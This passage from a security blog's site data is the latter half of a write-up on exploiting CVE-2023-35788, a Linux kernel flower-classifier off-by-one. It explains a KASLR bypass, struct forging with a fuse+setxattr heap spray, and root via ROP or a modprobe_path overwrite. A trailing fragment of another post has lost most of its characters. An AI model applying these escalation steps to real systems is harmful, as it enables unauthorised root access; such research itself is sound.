style=\"color:#E1E4E8\">...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\terr \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> fl_set_parms\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(net, tp, fnew, mask, base, tb, \u003C/span>\u003Cspan style=\"color:#FFAB70\">tca\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_RATE],\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t   tp->chain->tmplt_priv, flags, extack);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (err)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tgoto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> errout;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\terr \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> fl_check_assign_mask\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(head, fnew, fold, mask);\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">23\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (err)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tgoto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> errout;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Examining the function call flow of \u003Ccode>fl_set_key\u003C/code>, at position [23], our passed-in key and mask are processed, and the result is stored in \u003Ccode>f->mkey\u003C/code>. Unlike with the out-of-bounds write, we now have an additional structure, \u003Ccode>struct fl_flow_mask\u003C/code>, that we can perform out-of-bounds reads on.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_flow_mask {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_flow_key key;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_flow_mask_range range;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu32 flags;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> rhash_head ht_node;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> rhashtable ht;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> rhashtable_params filter_ht_params;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> flow_dissector dissector;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> list_head filters;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> rcu_work rwork;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> list_head list;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">\trefcount_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> refcnt;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> rhashtable {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> bucket_table __rcu\t\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">tbl;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tunsigned\u003C/span>\u003Cspan style=\"color:#F97583\"> int\u003C/span>\u003Cspan style=\"color:#E1E4E8\">\t\t\tkey_len;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tunsigned\u003C/span>\u003Cspan style=\"color:#F97583\"> int\u003C/span>\u003Cspan style=\"color:#E1E4E8\">\t\t\tmax_elems;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> rhashtable_params\tp;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tbool\u003C/span>\u003Cspan style=\"color:#E1E4E8\">\t\t\t\trhlist;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> work_struct\t\trun_work;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> mutex                    mutex;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">\tspinlock_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">\t\t\tlock;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">\tatomic_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">\t\t\tnelems;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> rhashtable_params {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu16\t\t\tnelem_hint;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu16\t\t\tkey_len;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu16\t\t\tkey_offset;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu16\t\t\thead_offset;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tunsigned\u003C/span>\u003Cspan style=\"color:#F97583\"> int\u003C/span>\u003Cspan style=\"color:#E1E4E8\">\t\tmax_size;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu16\t\t\tmin_size;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tbool\u003C/span>\u003Cspan style=\"color:#E1E4E8\">\t\t\tautomatic_shrinking;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">\trht_hashfn_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">\t\thashfn;\t\t\t\t\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> here\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">\trht_obj_hashfn_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">\tobj_hashfn;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">\trht_obj_cmpfn_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">\t\tobj_cmpfn;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>After inspecting the structure of \u003Ccode>fl_flow_mask\u003C/code>, we find a function pointer \u003Ccode>hashfn\u003C/code>, which serves as our function pointer to bypass KASLR! In my exploitation, it is assigned the \u003Ccode>rhashtable_jhash2\u003C/code> function.\u003C/p>\n\u003Ch3 id=\"off-by-one-translates-to-control-flow-hijacking\">off-by-one translates to control flow hijacking\u003C/h3>\n\u003Cp>Indeed, the situation is quite clear now.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_flow_tmplt {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_flow_key dummy_key;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fl_flow_key mask;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> flow_dissector dissector;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tcf_chain \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">chain;\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">24\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tcf_chain {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t/* Protects filter_chain. */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> mutex filter_chain_lock;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tcf_proto __rcu \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">filter_chain;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> list_head list;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tcf_block \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">block;\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">25\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu32 index;\u003C/span>\u003Cspan style=\"color:#6A737D\"> /* chain index */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tunsigned\u003C/span>\u003Cspan style=\"color:#F97583\"> int\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> refcnt;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tunsigned\u003C/span>\u003Cspan style=\"color:#F97583\"> int\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> action_refcnt;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tbool\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> explicitly_created;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tbool\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> flushing;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tconst\u003C/span>\u003Cspan style=\"color:#F97583\"> struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tcf_proto_ops \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">tmplt_ops;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tvoid\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">tmplt_priv;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> rcu_head rcu;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tcf_block {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t/* Lock protects tcf_block and lifetime-management data of chains\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t * attached to the block (refcnt, action_refcnt, explicitly_created).\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> mutex lock;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> list_head chain_list;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu32 index;\u003C/span>\u003Cspan style=\"color:#6A737D\"> /* block index for shared blocks */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tu32 classid;\u003C/span>\u003Cspan style=\"color:#6A737D\"> /* which class this block belongs to */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">\trefcount_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> refcnt;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> net \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">net;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> Qdisc \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">q;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> rw_semaphore cb_lock;\u003C/span>\u003Cspan style=\"color:#6A737D\"> /* protects cb_list and offload counters */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> flow_block flow_block;\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">26\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> flow_block_cb {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> list_head\tdriver_list;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> list_head\tlist;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">\tflow_setup_cb_t\u003C/span>\u003Cspan style=\"color:#F97583\">\t\t*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">cb;\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">27\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tvoid\u003C/span>\u003Cspan style=\"color:#F97583\">\t\t\t*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">cb_ident;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tvoid\u003C/span>\u003Cspan style=\"color:#F97583\">\t\t\t*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">cb_priv;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tvoid\u003C/span>\u003Cspan style=\"color:#E1E4E8\">\t\t\t(\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">release)(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">cb_priv);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> flow_block_indr\tindr;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tunsigned\u003C/span>\u003Cspan style=\"color:#F97583\"> int\u003C/span>\u003Cspan style=\"color:#E1E4E8\">\t\trefcnt;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>We need to forge from [24] to [27], which requires full control over our known heap address. Here, I utilize the fuse+setxattr technique for heap spraying, allowing further control over the heap contents. For more information about this technique, refer to the provided links [2] and [4].\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">static\u003C/span>\u003Cspan style=\"color:#F97583\"> int\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">__tc_setup_cb_call\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tcf_block \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">block\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">enum\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tc_setup_type \u003C/span>\u003Cspan style=\"color:#FFAB70\">type\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t   void\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\">type_data\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">bool\u003C/span>\u003Cspan style=\"color:#FFAB70\"> err_stop\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> flow_block_cb \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">block_cb;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tint\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ok_count \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tint\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> err;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\tlist_for_each_entry\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(block_cb, \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">block->flow_block.cb_list, list) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\terr \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> block_cb->\u003C/span>\u003Cspan style=\"color:#B392F0\">cb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(type, type_data, block_cb->cb_priv);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (err) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (err_stop)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\t\treturn\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> err;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t} \u003C/span>\u003Cspan style=\"color:#F97583\">else\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\tok_count\u003C/span>\u003Cspan style=\"color:#F97583\">++\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\treturn\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ok_count;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Its worth mentioning that, since we can forge the \u003Ccode>cb\u003C/code> virtual function and control the third parameter \u003Ccode>block_cb->cb_priv\u003C/code>, there are two potential privilege escalation strategies: one is direct ROP (Return-Oriented Programming), and the other is to find a suitable function to hijack control flow and convert it into arbitrary address read/write.\u003C/p>\n\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;../../assets/blog_img/2024-04-15/5.png&#x22;,&#x22;alt&#x22;:&#x22;5&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>As shown in the diagram above, we control four registers: \u003Ccode>rdx\u003C/code>, \u003Ccode>rcx\u003C/code> (utilized through multiple loops), \u003Ccode>rax\u003C/code>, and \u003Ccode>rip\u003C/code>. By using appropriate ROP gadgets, executing \u003Ccode>commit_cred(prepare_kernel_cred(0))\u003C/code> can accomplish privilege escalation.\u003C/p>\n\u003Cp>The technique used to return to user mode is \u003Ccode>swapgs_restore_regs_and_return_to_usermode\u003C/code>. For more information on this technique, please refer to the provided link [3].\u003C/p>\n\u003Cp>However, ROP (Return-Oriented Programming) is generally not very stable and requires extensive modifications to adapt to different kernel versions. Therefore, in the final version, I found a suitable function, \u003Ccode>dbg_set_reg\u003C/code>, and \u003Ccode>dbg_get_reg\u003C/code> (these two functions are available by default in Ubuntu), and combined them to modify \u003Ccode>modprobe_path\u003C/code> to achieve privilege escalation.\u003C/p>\n\u003Ch2 id=\"0x03-the-end\">0x03 The End\u003C/h2>\n\u003Cp>Thank you for reading. If you have any questions, feel free to contact us.\u003C/p>\n\u003Ch2 id=\"0x04-reference\">0x04 Reference\u003C/h2>\n\u003Cp>\u003Ca href=\"https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html\">cve-2021-22555\u003C/a>\u003C/p>\n\u003Cp>\u003Ca href=\"https://www.willsroot.io/2022/01/cve-2022-0185.html\">cve-2022-0185\u003C/a>\u003C/p>\n\u003Cp>\u003Ca href=\"https://www.anquanke.com/post/id/240006\">KPTI_bypass\u003C/a>\u003C/p>\n\u003Cp>\u003Ca href=\"https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019%20-%20Exploiting%20race%20conditions%20on%20Linux.pdf\">Exploiting_race_conditions_on_ancient_Linux\u003C/a>\u003C/p>\n\u003Cp>\u003Ca href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4d56304e5827c8cc8cc18c75343d283af7c4825c\">commit\u003C/a>\u003C/p>",{"headings":105,"localImagePaths":129,"remoteImagePaths":130,"frontmatter":131,"imagePaths":135},[106,110,113,116,120,123,126],{"depth":107,"slug":108,"text":109},2,"0x00-introduction","0x00 Introduction",{"depth":107,"slug":111,"text":112},"0x01-vulnerability-analysis","0x01 Vulnerability Analysis",{"depth":107,"slug":114,"text":115},"0x02-exploit","0x02 Exploit",{"depth":117,"slug":118,"text":119},3,"transforming-the-off-by-one-vulnerability-into-an-out-of-bounds-read-vulnerability","Transforming the off-by-one vulnerability into an out-of-bounds read vulnerability",{"depth":117,"slug":121,"text":122},"off-by-one-translates-to-control-flow-hijacking","off-by-one translates to control flow hijacking",{"depth":107,"slug":124,"text":125},"0x03-the-end","0x03 The End",{"depth":107,"slug":127,"text":128},"0x04-reference","0x04 Reference",[93,94,95,96,97,98,99],[],{"draft":14,"title":78,"snippet":79,"image":132,"publishDate":133,"category":85,"author":84,"tags":134},{"src":100,"alt":82},"2024-04-15 11:39",[87,88,89],[93,94,95,96,97,98,99],"2024-04-15-CVE-2023-35788.md","2025-09-22-bunniv2-exploit-analysis",{"id":137,"data":139,"body":147,"filePath":148,"assetImports":149,"digest":158,"rendered":159,"legacyId":182},{"draft":14,"title":140,"snippet":140,"image":141,"publishDate":143,"author":84,"category":144,"tags":145},"BunniV2 Exploit Analysis",{"src":142,"alt":140},"__ASTRO_IMAGE_/src/assets/blog_img/2025-09-22/bunni.jpg",["Date","2025-09-22T00:00:00.000Z"],"web3",[144,146],"hack analysis","\u003C!-- # BunniV2 Exploit Analysis -->\n\n202592 Bunni V2 840  Unichain  weETH/ETH  ETH  USDC/USDT\n\n\n\n```\n:\n* 